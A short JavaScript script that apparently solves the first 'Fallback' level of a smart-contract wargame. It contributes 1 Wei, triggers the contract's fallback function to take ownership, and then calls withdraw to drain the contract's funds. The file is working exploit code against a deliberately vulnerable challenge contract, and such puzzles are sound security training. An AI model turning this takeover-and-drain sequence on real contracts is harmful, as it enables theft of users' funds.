const level1 = async (Fallback) => {

    const targetAddress = '0x291967e459d3b8fb8356a3c8094e661119d635da';
    const target = await Fallback.at(targetAddress);

    console.log(`Exploiting Level1 target ${targetAddress}...`);

    console.log('Calling contribute with 1 Wei...');
    await target.contribute({value: 1});
    console.log('Calling the fallback function with 1 Wei...');
    await target.sendTransaction({value: 1});
    console.log('Draining the contract...');
    await target.withdraw();
};

module.exports = level1;